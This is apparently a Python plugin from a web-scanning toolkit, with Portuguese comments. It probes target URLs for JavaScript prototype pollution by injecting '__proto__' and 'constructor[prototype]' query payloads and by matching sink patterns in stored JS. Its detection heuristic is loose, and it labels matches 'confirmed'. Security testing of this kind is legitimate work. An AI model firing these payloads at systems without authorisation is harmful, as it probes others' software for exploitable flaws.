#!/usr/bin/env python3
"""
Prototype Pollution Detection (V10.1 Surgical) — Detecta poluição de protótipos JavaScript.
Analisa sinks e realiza prova de conceito prática (Object overwrite).
"""
import json
import time
import re
import httpx
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

# Padrões Pro (V10.1) — Sinks avançados
JS_SINK_PATTERNS = [
    (r"Object\.assign\s*\(", "Object.assign"),
    (r"_\.merge\s*\(", "lodash.merge"),
    (r"Object\.defineProperty\s*\(", "Object.defineProperty"),
    (r"JSON\.parse\s*\(", "JSON.parse sink"),
    (r"__proto__", "__proto__ ref"),
]

def _test_pollution(url: str) -> list:
    """Testa payloads de prototype pollution com prova de conceito prática."""
    findings = []
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs: return []

    # Payloads V10.1
    payloads = [
        ("__proto__[polluted]", "allma_v10_1"),
        ("constructor[prototype][polluted]", "allma_v10_1"),
        ("__proto__[toString]", "allma_v10_1_override"),
    ]

    for p_key, p_val in payloads:
        time.sleep(REQUEST_DELAY)
        test_qs = qs.copy()
        test_qs[p_key] = [p_val]
        new_query = urlencode(test_qs, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

        try:
            with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=True) as client:
                resp = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})
                body = resp.text.lower()

                # Prova de Conceito V10.1: 
                # Em um scanner de rede (sem browser), verificamos se o valor injetado 
                # é refletido no contexto de um objeto JS retornado ou em um script.
                # Se "allma_v10_1" aparecer grudado em chaves de objeto ou em locais indevidos.
                
                is_vuln = False
                reason = ""
                
                if p_val in body:
                    # Heurística: Checar se não é apenas echo de parâmetro comum
                    # Se o valor aparece mas o p_key NÃO aparece perto, pode ser merge
                    if p_key not in body or body.count(p_val) > body.count(p_key):
                        is_vuln = True
                        reason = f"Poluição detectada: Valor '{p_val}' refletido via merge de objeto (Payload: {p_key})"

                if is_vuln:
                    findings.append({
                        "url": url,
                        "test_url": test_url,
                        "type": "PROTOTYPE_POLLUTION",
                        "risk": "HIGH",
                        "details": reason,
                        "payload": f"{p_key}={p_val}",
                        "request_raw": format_http_request(resp.request),
                        "response_raw": format_http_response(resp),
                    })
                    break
        except Exception:
            pass
    return findings

def _scan_js_sinks(target: str) -> list:
    """Análise estática de JS para mapear potenciais sinks."""
    js_dir = Path("output") / target / "jsscanner"
    hints = []
    js_analysis_file = js_dir / "js_analysis.json"
    if js_analysis_file.exists():
        try:
            js_data = json.loads(js_analysis_file.read_text())
            for url, content in js_data.items():
                content_str = str(content)
                for pattern, name in JS_SINK_PATTERNS:
                    if re.search(pattern, content_str):
                        hints.append({
                            "url": url,
                            "type": "JS_SINK_DETECTED",
                            "risk": "MEDIUM",
                            "details": f"Sink vulnerável detectado em JS: '{name}'",
                            "sink": name
                        })
        except: pass
    return hints

def run(context: dict):
    target = context.get("target")
    stealth = context.get("stealth", False)
    if not target:
        raise ValueError("Target required")

    info(f"🧪 {C.BOLD}{C.CYAN}PROTOTYPE POLLUTION SCANNER (V10.1 SURGICAL){C.END}")
    outdir = ensure_outdir(target, "prototype_pollution")

    # 1. Static
    js_hints = _scan_js_sinks(target)
    
    # 2. Dynamic
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    candidates = []
    if urls_file.exists():
        urls = urls_file.read_text().splitlines()
        candidates = [u for u in urls if "?" in u and target in u]
    
    candidates = list(set(candidates))[:80]
    max_workers = 3 if stealth else 10
    
    param_results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(_test_pollution, url): url for url in candidates}
        for future in as_completed(futures):
            res = future.result()
            if res:
                param_results.extend(res)
                for f in res:
                    info(f"   🔴 {C.RED}[POLLUTION]{C.END} Confirmado em {f['url']}")

    all_results = param_results + js_hints
    output_file = outdir / "prototype_pollution_results.json"
    output_file.write_text(json.dumps(all_results, indent=2))
    success(f"   📂 Resultados salvos em {output_file}")
    return all_results
